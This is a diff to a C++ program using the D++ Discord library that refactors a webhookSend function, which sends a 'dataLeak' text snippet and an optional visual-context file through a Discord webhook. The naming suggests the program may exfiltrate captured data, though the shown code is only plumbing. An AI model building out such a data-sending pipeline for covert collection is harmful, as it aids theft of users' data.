@@ -1,7 +1,9 @@
 #include <dpp/dpp.h>
 #include <time.h>
-#include <string>
+#include <string_view>
 #include <iostream>
+
+#include <stdio.h>
 
 #define PTHREAD_FUNCTION void *
 
@@ -44,7 +46,7 @@ void initWebhook() {
     free(fileData);
 }
 
-void webhookSend(char *dataLeak, std::string *visualCtx, char *visualCtxName) {
+void webhookSend(char *dataLeak, std::string_view visualCtx, char *visualCtxName) {
     time_t thisTime;
     struct tm timeData;
     dpp::message leakMessage;
@@ -64,7 +66,7 @@ void webhookSend(char *dataLeak, std::string *visualCtx, char *visualCtxName) {
         leakMessage = dpp::message(caption).add_file("Snippet.text", dataLeak);
     }
  
-    if (visualCtx != nullptr) {
+    if (visualCtxName != nullptr) {
         leakMessage.add_file(visualCtxName, visualCtx);
     }
 
